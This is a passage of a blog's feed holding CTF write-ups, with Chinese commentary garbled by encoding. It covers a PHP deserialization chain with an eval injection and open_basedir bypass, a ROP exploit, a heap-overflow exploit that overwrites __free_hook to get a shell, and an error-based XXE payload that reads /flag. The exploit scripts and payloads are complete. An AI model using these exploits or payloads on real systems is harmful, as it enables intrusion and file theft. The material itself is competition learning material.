class="line">    <span class="keyword">public</span> $action ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;action=<span class="keyword">new</span> Welcome;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;willing)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;action-&gt;say_hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»ä¼¼äºå¼ºç½‘æ¯upload</p><p>å§¿åŠ¿ï¼š</p><p>ç”ŸæˆWelcome_again ç±»ï¼Œ</p><p>willing èµ‹å€¼ 1ï¼Œaction èµ‹å€¼ new Testï¼ˆï¼‰ï¼ŒTest ä¸­ èµ‹å€¼securuty ä»¥é”®å€¼å¯¹  â€˜say_helloâ€™=&gt; 1</p><p>åˆ©ç”¨é“¾ï¼š</p><p>é¦–å…ˆç”ŸæˆWelcome_again ç±»ï¼Œè°ƒç”¨__construct()æ–¹æ³•èµ‹å€¼action</p><p>ç„¶åè°ƒç”¨__destruct()æ–¹æ³•ï¼Œï¼ˆæ­¤æ—¶$this-&gt;willing=1ï¼‰</p><p>å› ä¸ºaction = new Test()</p><p>æ‰€ä»¥è°ƒç”¨  Test.say_hello()</p><p>ä½†æ˜¯Testæ²¡æœ‰è¯¥æ–¹æ³•ï¼Œæ‰€ä»¥è°ƒç”¨__call()æ–¹æ³•</p><p>ç„¶å  if($this-&gt;{$param1})</p><p>åˆæ²¡æœ‰æ”¹å±æ€§ï¼Œæ‰€ä»¥è°ƒç”¨__get()æ–¹æ³•</p><p>è¿”å›1ï¼ˆæˆ‘ä»¬ä¹‹å‰æ„é€ çš„é”®å€¼å¯¹ä¸­çš„å€¼ï¼‰</p><p>ç„¶åé€šè¿‡åˆ¤æ–­ï¼Œ</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨  ;  æˆªæ–­ï¼Œ</p><p>ä½¿å¾—evalæ‰§è¡Œä¸æ­¢ä¸€ä¸ªå‡½æ•°</p><p>ç„¶åç¿»å‡ºä¹‹å‰æ”¶è—çš„è¯»æ–‡ä»¶ä¸€æŠŠæ¢­ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="variable">$fp</span> = fopen(<span class="string">"./index.php"</span>,<span class="string">"r"</span>);<span class="variable">$str</span> = fread(<span class="variable">$fp</span>,filesize(<span class="string">"./index.php"</span>));<span class="built_in">echo</span> <span class="variable">$str</span> = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">1;<span class="built_in">echo</span> readfile(<span class="string">"./index.php"</span>);</span><br></pre></td></tr></table></figure><p>(å¿˜è®°å½“æ—¶ç”¨çš„å“ªä¸ªäº†)</p><p>å‘ç°æˆåŠŸ</p><p>ç„¶åå»è¯»flag</p><p>å‘ç°å¤±è´¥ï¼Œ</p><p>è¦bypass open_basedir</p><p>å‚è€ƒwp</p><p><a href="https://blog.csdn.net/systemino/article/details/94645518ä¸­çš„" target="_blank" rel="noopener">https://blog.csdn.net/systemino/article/details/94645518ä¸­çš„</a></p><p>å°è¯•æ„é€ ï¼š</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'/tmp'</span>);</span><br><span class="line"><span class="selector-tag">mkdir</span>(<span class="string">'sky'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'sky'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'..'</span>);</span><br><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line"><span class="selector-tag">echo</span>(file_get_contents(<span class="string">'/var/www/flag.php'</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bs%3A1%3A%221%22%3B%7D%7D%7D</span><br><span class="line">&amp;dangerous=<span class="number">1</span>;<span class="keyword">chdir</span>(<span class="string">'/tmp'</span>);<span class="keyword">mkdir</span>(<span class="string">'sky'</span>);<span class="keyword">chdir</span>(<span class="string">'sky'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);<span class="keyword">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);echo(file_get_contents(<span class="string">'/var/www/flag.php'</span>));</span><br></pre></td></tr></table></figure><h2 id="å…­å°˜"><a href="#å…­å°˜" class="headerlink" title="å…­å°˜"></a>å…­å°˜</h2><p>éé¢„æœŸè§£</p><p>wwwscanæ‰«æåˆ°å­˜åœ¨logï¼Œ</p><p>è®¿é—®<a href="http://111.33.164.6:10005/log/access.log" target="_blank" rel="noopener">http://111.33.164.6:10005/log/access.log</a></p><p>æœç´¢flagå‘ç°<br><img src="https://i.loli.net/2020/04/30/xAfJQ89qsvkcOtr.png" alt="wwwscan"></p><p>ä¼¼ä¹æ˜¯åˆ«çš„è§£å‡ºé¢˜ç›®çš„é˜Ÿä¼å»æ‹¿flagæ—¶ç•™ä¸‹æ¥çš„æµé‡ï¼Ÿï¼ˆç™½å«–ä¸€æ‰‹ï¼‰</p><p>è¿›å»åŠ ä¸Štokenå³å¯å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 OGeek</title>
      <link href="/2019/08/27/2019OGeek/"/>
      <url>/2019/08/27/2019OGeek/</url>
      
        <content type="html"><![CDATA[<h3 id="catch-fun"><a href="#catch-fun" class="headerlink" title="catch fun"></a>catch fun</h3><p>é¢˜ç›®æè¿°ï¼šoppo catch fun</p><p>â€‹        æç¤ºï¼šoppoâ€™s phone modelï¼Œflag{} is required</p><p>ç™¾åº¦ï¼š oppo catch fun</p><p><img src="https://i.loli.net/2020/04/30/xTf45hCVaZrkQGe.png" alt="catch fun"></p><p>æ ¹æ®æç¤ºå¾—åˆ°flag</p><p>flag{Reno}</p><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>é¢˜ç›®æè¿°ï¼šFrom the ground up.</p><p>è¿™é“é¢˜ç®€å•çœ‹çœ‹ï¼Œstrncmpå‡½æ•°å¯ä»¥ç»•è¿‡ï¼Œv1å³æ¯”è¾ƒçš„é•¿åº¦å¯ä»¥æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥éšæ„è¾“å…¥ä¸€ä¸ªæ•°å­—æ¯”å¦‚1ï¼Œç„¶åå’Œéšæœºæ•°æ¯”è¾ƒç¬¬ä¸€ä¸ªæ•°å­—ï¼Œçˆ†ç ´ç»•è¿‡ã€‚æ¥ç€å­˜åœ¨æ ˆæº¢å‡ºå¯èƒ½æ€§çš„å‡½æ•°çš„æº¢å‡ºé•¿åº¦æœ€å¤§ä¸º0xffï¼Œä¸”å¯ä»¥ç”±ä¸Šä¸€ä¸ªå‡½æ•°çš„è¾“å…¥æ¥æ§åˆ¶ã€‚å‰©ä¸‹çš„å°±æ˜¯ç®€å•çš„ropäº†ã€‚</p><p>expè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"><span class="meta">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#p = process(<span class="string">"./babyrop"</span>)</span></span><br><span class="line">p = remote(<span class="string">'47.112.137.238'</span>, <span class="number">13337</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x080487D0</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'1'</span>+<span class="string">'\x00'</span>*<span class="number">6</span> + <span class="string">'\xff'</span> + <span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(elf.plt[<span class="string">'puts'</span>]) + p32(vuln_addr) + p32(elf.got[<span class="string">'puts'</span>]) + p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">libcbase = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="meta">#libcbase = u32(p.recv(4).ljust(4, <span class="string">'\x00'</span>)) - 0x60ca0</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="meta">#system_addr = libcbase + 0x3bda0</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(system_addr) + p32(vuln_addr) + p32(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/Imwa5hQufLGrjTe.png" alt="babyrop"></p><h3 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h3><p>é¢˜ç›®æè¿°ï¼šEndless book writing.</p><p>ç®€å•é€†ä¸€ä¸‹ï¼Œå¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°addtextå‡½æ•°ä¸­å‡ºç°å †æº¢å‡ºï¼Œå½“v7çš„å€¼å°äº0x100æ—¶ï¼Œå¯ä»¥å¾€é‡Œé¢å†™å…¥0x100ä¸ªå­—èŠ‚ã€‚äºæ˜¯æ„é€ ä¸€ä¸‹å †ç»“æ„ï¼Œæ”¹å†™ä¸€ä¸ªtext_ptræŒ‡å‘å·²ç»é‡Šæ”¾åœ¨unsortedbinä¸­chunkï¼Œç„¶åshowbookï¼Œæ³„éœ²å‡ºlibcï¼Œç„¶åå†åˆ©ç”¨æº¢å‡ºä¿®æ”¹ä¸€ä¸ªtext_ptræŒ‡å‘free_hookï¼Œæ”¹å†™ä¸ºsystemå‡½æ•°åœ°å€ï¼Œç„¶åfreeä¸€ä¸ª/bin/shå³å¯getshellã€‚è„šæœ¬å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./bookmanager')</span></span><br><span class="line">p = remote(<span class="string">'47.112.115.30'</span>, <span class="number">13337</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddSection</span><span class="params">(chapterName, sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which chapter do you want to add into:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line">    sectionAddr = int(p.recvuntil(<span class="string">'\nSection name:'</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    <span class="keyword">return</span> sectionAddr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddText</span><span class="params">(sectionName, size, text)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhich section do you want to add into:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    p.recvuntil(<span class="string">'\nHow many chapters you want to write:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'\nText:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelSection</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelText</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">6</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowBook</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(flag, oldName, newName)</span>:</span></span><br><span class="line">    choose(<span class="number">8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhat to update?(Chapter/Section/Text):'</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        p.sendline(<span class="string">'Chapter'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Chapter name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">2</span>:</span><br><span class="line">        p.sendline(<span class="string">'Section'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Section name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">3</span>:</span><br><span class="line">        p.sendline(<span class="string">'Text'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Text:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Name of the book you want to create: '</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">AddChapter(<span class="string">'cha1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec1'</span>)</span><br><span class="line">AddText(<span class="string">'sec1'</span>, <span class="number">0x10</span>, <span class="string">'text1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec2'</span>)</span><br><span class="line">AddText(<span class="string">'sec2'</span>, <span class="number">0x100</span>, <span class="string">'text2'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec3'</span>)</span><br><span class="line">sec4_addr = AddSection(<span class="string">'cha1'</span>, <span class="string">'sec4'</span>)</span><br><span class="line">text4_addr = sec4_addr + <span class="number">0x40</span></span><br><span class="line">AddText(<span class="string">'sec4'</span>, <span class="number">0x90</span>, <span class="string">'text4'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec5'</span>)</span><br><span class="line">AddText(<span class="string">'sec5'</span>, <span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec4'</span>)</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(text4_addr) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">ShowBook()</span><br><span class="line">p.recvuntil(<span class="string">'Section:sec2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n      Text:'</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span> </span><br><span class="line">log.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">free_hook = libcbase + <span class="number">0x3C67A8</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(free_hook) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec2'</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec5'</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/PkQzGawD4UtrIFo.png" alt="book manager"></p><h3 id="Look-Around"><a href="#Look-Around" class="headerlink" title="Look Around"></a>Look Around</h3><p>é¢˜ç›®æè¿°ï¼šbuilded from tomcat:8-jre8</p><p>è¿›å…¥é¶æœºï¼Œf12ä¸€æ³¢ï¼Œå‘ç°</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/_.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›å…¥ï¼š<a href="http://47.107.253.140:18080/webserver/js/_.js" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/js/_.js</a></p><p>å¾—åˆ°</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var data = "<span class="meta">&lt;?xml version=\"1.0\" ?&gt;</span>\n<span class="tag">&lt;<span class="name">request</span>&gt;</span>\n    <span class="tag">&lt;<span class="name">status</span>&gt;</span>1<span class="tag">&lt;/<span class="name">status</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">request</span>&gt;</span>";</span><br><span class="line"></span><br><span class="line">setInterval(function()&#123;</span><br><span class="line">    $.post("callback", data);</span><br><span class="line">&#125;, 10000);</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯XXE</p><p>äºæ˜¯è¿›å…¥æ¥å£callback</p><p><img src="https://i.loli.net/2020/04/30/OrwX4yQTz7GoYA6.png" alt="Look Around"></p><p>è¦POSTï¼Œæ‰€ä»¥æŠ“åŒ…ï¼Œ</p><p>ç„¶åä¸ä¹…å‰å­¦XXEæ—¶çœ‹åˆ°è¿‡è¿™ç¯‡æ ¹æ®æœ¬åœ°DTDæ¥å®ç°XXEçš„æ–‡ç« </p><p><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p><p>äºæ˜¯æƒ³åœ¨è¿™é‡Œè¯•è¯•ã€‚</p><p>ä½†æ˜¯æœ¬åœ°æœ‰å•¥DTDæ–‡ä»¶å‘¢ï¼Ÿå‘ç°é¢˜ç›®ç»™äº†æç¤ºã€‚äºæ˜¯æ ¹æ®é¢˜ç›®æè¿°ï¼Œä¸‹è½½åŒåé•œåƒï¼Œ</p><p>ç»™ä¸ªdockerï¼Œç„¶åæ‰¾å…¶ä¸­çš„dtdæ–‡ä»¶ï¼Œå‘ç°äº†ä¸€ä¸ªæ–‡ç« ä¸­æåˆ°çš„æ–‡ä»¶</p><p>/usr/share/xml/fontconfig/fonts.dtd</p><p>äºæ˜¯ç”¨æ–‡ç« é‡Œçš„payload ä¸€æŠŠæ¢­</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message [</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">local_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">usr</span>/<span class="attr">share</span>/<span class="attr">xml</span>/<span class="attr">fontconfig</span>/<span class="attr">fonts.dtd</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">expr</span> '<span class="attr">aaa</span>)&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">abcxyz</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">        &amp;#x25;eval;</span></span><br><span class="line"><span class="xml">        &amp;#x25;error;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">aa</span> (<span class="attr">bb</span>'&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="perl">    %local_dtd;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/04/30/CYjDFbEnNcAzvhO.png" alt="Look Around"></p><p>flag{f1c6811d4dce2ae37613cee977febe305f4de8fe}</p><h3 id="Render"><a href="#Render" class="headerlink" title="Render"></a>Render</h3><p>é¢˜ç›®æè¿°ï¼šWrite something you want to see.</p><p>è¿›å…¥é¶æœºï¼Œf12ï¼Œå‘ç°ï¼š</p><figure class="highlight 